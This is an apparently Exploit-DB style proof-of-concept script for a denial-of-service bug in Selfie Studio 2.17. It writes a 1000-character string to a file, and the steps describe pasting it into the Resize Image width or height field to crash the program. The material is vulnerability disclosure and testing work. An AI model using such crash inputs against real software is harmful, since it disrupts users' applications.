# -*- coding: utf-8 -*-
# Exploit Title: Selfie Studio 2.17 - 'Resize Image' Denial of Service (PoC)
# Date: 13/05/2019
# Author: Alejandra Sánchez
# Vendor Homepage: http://www.pixarra.com
# Software Link http://www.pixarra.com/uploads/9/4/6/3/94635436/tbselfiestudio_install.exe
# Version: 2.17
# Tested on: Windows 10

# Proof of Concept:
# 1.- Run the python script "Selfie_resize.py", it will create a new file "PoC.txt"
# 2.- Copy the text from the generated PoC.txt file to clipboard
# 3.- Open Selfie Studio
# 4.- Go to 'Image' > 'Resize Image...' 
# 5.- Paste clipboard in the 'New Width/New Height' field
# 6.- Click OK
# 7.- Crashed

buffer = "\x41" * 1000
f = open ("PoC.txt", "w")
f.write(buffer)
f.close()